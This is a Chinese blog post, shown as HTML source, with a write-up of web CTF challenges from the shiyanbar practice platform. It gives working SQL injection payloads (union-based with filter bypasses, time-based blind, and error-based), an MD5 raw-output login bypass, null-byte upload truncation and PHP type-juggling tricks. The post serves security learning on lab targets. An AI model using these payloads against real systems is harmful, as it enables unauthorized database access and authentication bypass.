@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,web,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="上学期开学那段时间刷的，开始有点做题的感觉了&amp;lt;(￣︶￣)&amp;gt; 后台登录F12可以看到注释里给出了查询的sql，这个语句将password进行了md5加密  md5()这个函数前一个参数为输入字符串，后一个为输出进制。true时为二进制，false时为十六进制我们可以用这个字符串：ffifdyop它进过md5后，加密方式设为true时为 ‘or’6�]��!r,��b ；false时为 2">
+<meta name="keywords" content="ctf,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实验吧 web wp">
+<meta property="og:url" content="http://yoursite.com/2019/02/04/实验吧-web-wp/index.html">
+<meta property="og:site_name" content="shifeng_kazeの家">
+<meta property="og:description" content="上学期开学那段时间刷的，开始有点做题的感觉了&amp;lt;(￣︶￣)&amp;gt; 后台登录F12可以看到注释里给出了查询的sql，这个语句将password进行了md5加密  md5()这个函数前一个参数为输入字符串，后一个为输出进制。true时为二进制，false时为十六进制我们可以用这个字符串：ffifdyop它进过md5后，加密方式设为true时为 ‘or’6�]��!r,��b ；false时为 2">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/76ec72d54f41badb36366bd9f3aca269.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/ea7231db992902b65f5458d8cee572b5.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/887d7fc853627c29cbdcad3e742f0c0d.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/5dc205f061ea9c8120214a6edd9fea5b.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/18cb09c8292b452fbd750e319707b719.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/02965165c985a95d04255a79c3242a4f.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/77e6f282ce6da617d054f65665d1deca.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/e8356b2b4226817cac4b39566dc7341c.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/095e056c6641f6c0959d3dd6f93bc170.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/f2d001710d4d8ac50eedf975f33304ae.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/b1489882662b89fa3093e8e4df4cb748.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/9414a6e9bc1ed29234dae23190999b87.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/f71c8b20a600427301ca0ea8d0b73698.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/aee0d3739431210a3d9d58fd405e3c28.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/e644e09ddd49a202308380f7036f6694.png">
+<meta property="og:image" content="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/e5d5f51ccdb1041875a589882f412b1c.png">
+<meta property="og:updated_time" content="2019-02-04T05:44:24.445Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="实验吧 web wp">
+<meta name="twitter:description" content="上学期开学那段时间刷的，开始有点做题的感觉了&amp;lt;(￣︶￣)&amp;gt; 后台登录F12可以看到注释里给出了查询的sql，这个语句将password进行了md5加密  md5()这个函数前一个参数为输入字符串，后一个为输出进制。true时为二进制，false时为十六进制我们可以用这个字符串：ffifdyop它进过md5后，加密方式设为true时为 ‘or’6�]��!r,��b ；false时为 2">
+<meta name="twitter:image" content="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/76ec72d54f41badb36366bd9f3aca269.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/02/04/实验吧-web-wp/">
+
+
+
+
+
+  <title>实验吧 web wp | shifeng_kazeの家</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">shifeng_kazeの家</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/04/实验吧-web-wp/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="shifeng_kaze">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://shifeng-kaze.cn/blog/head/kotori.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="shifeng_kazeの家">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">实验吧 web wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-04T11:29:14+08:00">
+                2019-02-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>上学期开学那段时间刷的，开始有点做题的感觉了&lt;(￣︶￣)&gt;</p>
+<h2 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h2><p>F12可以看到注释里给出了查询的sql，这个语句将password进行了md5加密</p>
+<p><img src="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/76ec72d54f41badb36366bd9f3aca269.png" alt=""></p>
+<p>md5()这个函数前一个参数为输入字符串，后一个为输出进制。true时为二进制，false时为十六进制<br>我们可以用这个字符串：ffifdyop<br>它进过md5后，加密方式设为true时为 ‘or’6�]��!r,��b ；false时为 276f722736c95d99e921722cf9ed6<br>21c 转为字符串后是 ‘or’6<br>然后获得flag</p>
+<h2 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h2><p>一看就是js之类的码，用控制台输出</p>
+<h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p>做过的题，这里还是想了想为什么%00截断可以<br>应该是这里dir是文件保存的路径，然后会接filename在uploads/之后。因为这里用%00截断，于是储存路径就变成uploads/1.php%001.jpg，1.jpg不会被读到，于是就被认为是储存的是php文件。而一开始的判断只是靠filename而已，所以就会是jpg的判断，结果就通过得flag</p>
+<h2 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h2><p>这题过滤的东西有点坑<br>一开始以为是过滤了union select，然后又以为是空格，但好像都不对。最后用’1(语句)1’才查出过滤了什么<br>查到了过滤了’union ‘,’select ‘,’from ‘,’where ‘,’table_schema’,’information_schema.columns’,<br>‘table_schema’,’column_name’<br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos; unionunion  selectselect  database()&apos;</span><br><span class="line">&apos; unionunion  selectselect  table_name fromfrom  information_schema.tables wherewhere  table_table_schemaschema=&apos;web1&apos; or &apos;</span><br><span class="line">&apos; unionunion  selectselect  columncolumn_name_name fromfrom  information_sinformation_schema.columnschema.columns wherewhere  table_name=&apos;flag&apos; or &apos;</span><br><span class="line">&apos; unionunion  selectselect  flag fromfrom  flag wherewhere  &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+<h2 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h2><p>这题打开就是代码审计，虽然很长，但很有意义，学到了不少绕过技巧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">// code by SEC@USTC </span><br><span class="line"></span><br><span class="line">echo &apos;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;charset&quot; content=&quot;gbk&quot;&gt;&lt;/head&gt;&lt;body&gt;&apos;; </span><br><span class="line"></span><br><span class="line">$URL = $_SERVER[&apos;REQUEST_URI&apos;]; </span><br><span class="line">//echo &apos;URL: &apos;.$URL.&apos;&lt;br/&gt;&apos;; </span><br><span class="line">$flag = &quot;CTF&#123;???&#125;&quot;; </span><br><span class="line"></span><br><span class="line">$code = str_replace($flag, &apos;CTF&#123;???&#125;&apos;, file_get_contents(&apos;./index.php&apos;)); </span><br><span class="line">$stop = 0; </span><br><span class="line"></span><br><span class="line">//这道题目本身也有教学的目的 </span><br><span class="line">//第一，我们可以构造 /indirection/a/../ /indirection/./ 等等这一类的 </span><br><span class="line">//所以，第一个要求就是不得出现 ./ </span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;./&apos;) !== FALSE)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 1;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第二，我们可以构造 \ 来代替被过滤的 / </span><br><span class="line">//所以，第二个要求就是不得出现 ../ </span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;\\&apos;) !== FALSE)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 2;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第三，有的系统大小写通用，例如 indirectioN/ </span><br><span class="line">//你也可以用?和#等等的字符绕过，这需要统一解决 </span><br><span class="line">//所以，第三个要求对可以用的字符做了限制，a-z / 和 . </span><br><span class="line">$matches = array(); </span><br><span class="line">preg_match(&apos;/^([0-9a-z\/.]+)$/&apos;, $URL, $matches); </span><br><span class="line">if($flag &amp;&amp; empty($matches) || $matches[1] != $URL)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 3;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第四，多个 / 也是可以的 </span><br><span class="line">//所以，第四个要求是不得出现 // </span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;//&apos;) !== FALSE)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 4;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第五，显然加上index.php或者减去index.php都是可以的 </span><br><span class="line">//所以我们下一个要求就是必须包含/index.php，并且以此结尾 </span><br><span class="line">if($flag &amp;&amp; substr($URL, -10) !== &apos;/index.php&apos;)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 5;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第六，我们知道在index.php后面加.也是可以的 </span><br><span class="line">//所以我们禁止p后面出现.这个符号 </span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;p.&apos;) !== FALSE)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 6;        //Pass </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">//第七，现在是最关键的时刻 </span><br><span class="line">//你的$URL必须与/indirection/index.php有所不同 </span><br><span class="line">if($flag &amp;&amp; $URL == &apos;/indirection/index.php&apos;)&#123; </span><br><span class="line">    $flag = &quot;&quot;; </span><br><span class="line">    $stop = 7;        //Pass </span><br><span class="line">&#125; </span><br><span class="line">if(!$stop) $stop = 8; </span><br><span class="line"></span><br><span class="line">echo &apos;Flag: &apos;.$flag; </span><br><span class="line">echo &apos;&lt;hr /&gt;&apos;; </span><br><span class="line">for($i = 1; $i &lt; $stop; $i++) </span><br><span class="line">    $code = str_replace(&apos;//Pass &apos;.$i, &apos;//Pass&apos;, $code); </span><br><span class="line">for(; $i &lt; 8; $i++) </span><br><span class="line">    $code = str_replace(&apos;//Pass &apos;.$i, &apos;//Not Pass&apos;, $code); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo highlight_string($code, TRUE); </span><br><span class="line"></span><br><span class="line">echo &apos;&lt;/body&gt;&lt;/html&gt;&apos;;</span><br></pre></td></tr></table></figure>
+<p>比如用..回到上级目录以进行绕过得到index.php；用\来代替/；大小写绕过；//代替/；index.php.代替index.php<br>这题主要考点是伪静态页面，可以通过/index.php/index.php绕过获得flag。这里在后面的index.php并不是作为文件，而是作为一个参数传入index.php，继而成功绕过</p>
+<p>payload: <code>http://ctf5.shiyanbar.com/indirection/index.php/index.php</code></p>
+<h2 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h2><p>这题完全坑人引导啊！！！<br>F12发现有个input被hidden，且设值为0，名字叫showsource</p>
+<p>觉得有用就试着修改为1然后提交就出了一段代码，很明显直接把a的值提交上去就能获得flag了</p>
+<h2 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h2><p>做过的题，ereg用%00截断绕过，长度用科学计数法绕过<br>payload:\ <code>password=1e9%00*-*</code></p>
+<h2 id="guess-next-session"><a href="#guess-next-session" class="headerlink" title="guess next session"></a>guess next session</h2><p>这题一看源码就知道提示又在坑人</p>
+<p><img src="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/ea7231db992902b65f5458d8cee572b5.png" alt=""></p>
+<p>一开始想着让password为true就行，然而怎么都不行，怎么都会被认为是str的true。于是换个思路，既然这里是从session里取出password的话，那把session清空不就完了。用burpsuit发送个不带cookie的数据包，此时由于是第一次登录，而session的初始值都为0于是就password为空就能获得flag</p>
+<p>记得这题打开时就创建了cookie，于是再输入空password也没用，只能清空cookie</p>
+<h2 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h2><p>又是sha的题，数组或加密后为科学计数法绕过都行</p>
+<h2 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单!"></a>这个看起来有点简单!</h2><p>太过简单以致做不出来的题【笑哭脸<br>没想到这题连单引号都不用加</p>
+<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0 union select 1,2</span><br><span class="line">0 union select 1,table_name from information_schema.tables where table_schema=database()</span><br><span class="line">0 union select 1,column_name from information_schema.columns where table_name=&apos;thiskey&apos;</span><br><span class="line">0 union select 1,k0y from thiskey</span><br></pre></td></tr></table></figure></p>
+<h2 id="你真的会PHP吗？"><a href="#你真的会PHP吗？" class="headerlink" title="你真的会PHP吗？"></a>你真的会PHP吗？</h2><p>先用一波burpsuit发现hint，这次终于不会眼瞎了hhh<br>然后用着个获得了一波源码，审核一下，大概就是</p>
+<p><img src="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/887d7fc853627c29cbdcad3e742f0c0d.png" alt=""></p>
+<p>首先要是一个字符串<br>然后不是数字，并在int再str之后会和原本相同<br>再是int后是个回文，但str后一个个对又不是回文<br>这题第一反应应该是要用科学计数法或十六进制，但怎么都不行。想过%00但以为不能对这几个函数起作用。然而查了wp知道是有用的，%00能让is_numeri返回false。于是就很简单了，number=0e-0%00得解</p>
+<h2 id="登陆一下好吗"><a href="#登陆一下好吗" class="headerlink" title="登陆一下好吗??"></a>登陆一下好吗??</h2><p>这题一开始试了一下or和’,发现or不行而’可以，就脑补了一下sql语句应该是：<br><code>select * from where username=&#39;&#39; and password=&#39;&#39;</code><br>然后or被过滤估计and也是被过滤，这是就想到了^。实际上答案也确实使用这个，但我并没解出来，不过又学到了一点东西<br>当进行sql查询时，如果该列中都是字符串的话，只要查询的列值为0就可以全部查出，没想到sql里也是弱类型的。这里试着用username=’^’aaa&amp;password=’^’aaa，这里’’的值为0，而字符串的值也认为是0（应该是有单引号就判断是字符串了），0^0=0。但并没出flag，估计是password有数字开头，于是就用之前见过的注释方法，username=\&amp;password=^’aaa得到flag</p>
+<h2 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h2><p>这题又是奇淫技巧，虽然我的想法和wp差不多，但太菜以致我没解出来orz<br>F12发现有一个source.txt,是登录的源码</p>
+<p><img src="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/5dc205f061ea9c8120214a6edd9fea5b.png" alt=""></p>
+<p>这里过滤了一大堆，但基本都能用/**/绕过，但，()被过滤了就很难受，本来想用类似于union select 1,2然后password=2就能过的，但这里过滤了就头很大。就只能想到盲注，但不想这么搞就查了一下wp，发现一个payload：<br><code>uname=&#39; or 1=1 group by psw with rollup limit 1 offset 2#&amp;psw=</code><br>真的是又踏入了我的知识盲区，给这里的group by…with rollup举个例子<br>若是<br><code>select dep,pos,avg(sal) from employee group by dep,pos;</code><br>查出</p>
+<p>| dep | pos | avg(sal) |<br>+——+——+———–+<br>| 01 | 01 | 1500.0000 |<br>| 01 | 02 | 1950.0000 |<br>| 02 | 01 | 1500.0000 |<br>| 02 | 02 | 2450.0000 |<br>| 03 | 01 | 2500.0000 |<br>| 03 | 02 | 2550.0000 |</p>
+<p>而<br><code>select dep,pos,avg(sal) from employee group by dep,pos with rollup;</code><br>查出的是</p>
+<p>| dep | pos | avg(sal) |<br>+——+——+———–+<br>| 01 | 01 | 1500.0000 |<br>| 01 | 02 | 1950.0000 |<br>| 01 | NULL | 1725.0000 |<br>| 02 | 01 | 1500.0000 |<br>| 02 | 02 | 2450.0000 |<br>| 02 | NULL | 2133.3333 |<br>| 03 | 01 | 2500.0000 |<br>| 03 | 02 | 2550.0000 |<br>| 03 | NULL | 2533.3333 |<br>| NULL | NULL | 2090.0000 |</p>
+<p>它会再以第一列进行统计，而此时第二列则为NULL<br>利用这个性质，我们可以修改offset直到使第二列为NULL，此时使password为空便能通过</p>
+<p>还有这里中的数据库里可以查到只有两条，所以这条payload能用</p>
+<h2 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h2><p>看了一下就知道使用X-Forwarded-For进行insert的时间盲注</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos; or sleep(3 * ((select length(group_concat(table_name)) from information_schema.tables where table_schema=database())&gt;=5000)) or &apos;</span><br><span class="line">&apos; or sleep(3 * ((select length(group_concat(column_name)) from information_schema.columns  where table_name=&apos;flag&apos;)&gt;=5000)) or &apos;</span><br><span class="line">&apos; or sleep(3 * ((select length(group_concat(flag)) from flag )&gt;=5000)) or &apos;</span><br></pre></td></tr></table></figure>
+<p>不过之前写过一个脚本有些烂，找了个大佬的脚本来跑，这里就不放出来了</p>
+<h2 id="简单的sql注入之3"><a href="#简单的sql注入之3" class="headerlink" title="简单的sql注入之3"></a>简单的sql注入之3</h2><p>不是很难，尝试了一下updatexml()和floor()不行后就觉得应该会用到一些奇怪的报错，又试了几个后就找到了一个比较常见能用的报错注入<br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos; and geometrycollection((select * from(select * from(select group_concat(table_name) from information_schema.tables where table_schema=database())a)b))#</span><br><span class="line">&apos; and geometrycollection((select * from(select * from(select group_concat(column_name) from information_schema.columns where table_name=&apos;flag&apos;)a)b))#</span><br><span class="line">&apos; and geometrycollection((select * from(select * from(select group_concat(flag) from flag)a)b))#</span><br></pre></td></tr></table></figure>
+<p>之后还从别人的wp里学到了一个少见的ceil()报错：<br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1 offset 0),ceil(rand(0)*2))x from information_schema.tables group by x)a)# </span><br><span class="line">&apos; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&apos;flag&apos; limit 1 offset 0),ceil(rand(0)*2))x from information_schema.tables group by x)a)#</span><br><span class="line">&apos; and (select 1 from (select count(*),concat((select flag from flag limit 1 offset 0),ceil(rand(0)*2))x from information_schema.tables group by x)a)#</span><br></pre></td></tr></table></figure>
+<h2 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h2><p>由提示就用burpsuit抓包，发现flag的提示，下面提示post为key的值获得flag</p>
+<p><img src="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/18cb09c8292b452fbd750e319707b719.png" alt=""></p>
+<p>尝试了一下说是不够快，那就是要写脚本了</p>
+<p><img src="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/02965165c985a95d04255a79c3242a4f.png" alt=""></p>
+<p>python走一波，获得flag</p>
+<h2 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h2><p>进去没找到什么，就试着抓包</p>
+<p><img src="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/77e6f282ce6da617d054f65665d1deca.png" alt=""></p>
+<p>发现管理员邮箱账号，然后提示step2.php,又提示了vim，就猜可能会有遗留未删的备份</p>
+<p><img src="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/e8356b2b4226817cac4b39566dc7341c.png" alt=""></p>
+<p>打开step2发现submit.php，然后尝试.submit.php.swp获得了源码</p>
+<p><img src="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/095e056c6641f6c0959d3dd6f93bc170.png" alt=""></p>
+<p>这里一个很简单的绕过<br><a href="mailto:`?token=0.00000000&amp;emailAddress=admin@simplexue.com" target="_blank" rel="noopener">`?token=0.00000000&amp;emailAddress=admin@simplexue.com</a>`<br>得flag</p>
+<h2 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h2><p><img src="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/f2d001710d4d8ac50eedf975f33304ae.png" alt=""></p>
+<p>挺简单的题，反解码一下就出来了</p>
+<p><img src="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/b1489882662b89fa3093e8e4df4cb748.png" alt=""></p>
+<h2 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h2><p>查看源码，发现一个有可能是源码的文件</p>
+<p><img src="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/9414a6e9bc1ed29234dae23190999b87.png" alt=""></p>
+<p>打开发现果然是</p>
+<p><img src="http://shifeng-kaze.cn/blog/shiyanbar_web_wp/f71c8b20a600427301ca0ea8d0b73698.png" alt=""></p>
+<p>读一下就知道该这么做了<br><code>user=&#39; union select md5(1)&amp;password=1</code></p>
+<h2 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h2><p>提示index.php.txt<br>又是两次url解码, <code>?id=hackerD%254A</code> 得flag</p>
+<h2 id="简单的sql注入之2"><a href="#简单的sql注入之2" class="headerlink" title="简单的sql注入之2"></a>简单的sql注入之2</h2><p>这题我也说不准到底过滤了什么，大概只有获得源码才能一探究竟了吧<br>试了大概是过滤了’ union’、’union ‘，这个是确定的，但后面两个我就不清楚是这么过滤的了<br>select左右有/**/时就不会检测出来，没有的话就算单是输入select都会检测到。而）则是右边为/**/时就不会检测出来。(也许是过滤了空格吧)<br>于是payload就是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;/**/union/**/select/**/1#</span><br><span class="line">&apos;/**/union/**/select/**/table_name from information_schema.tables where table_schema=database()/**/#</span><br><span class="line">&apos;/**/union/**/select/**/column_name from information_schema.columns where table_name=&apos;flag&apos;/**/#</span><br><span class="line">&apos;/**/union/**/select/**/flag from flag/**/#</span><br></pre></td></tr></table></figure>
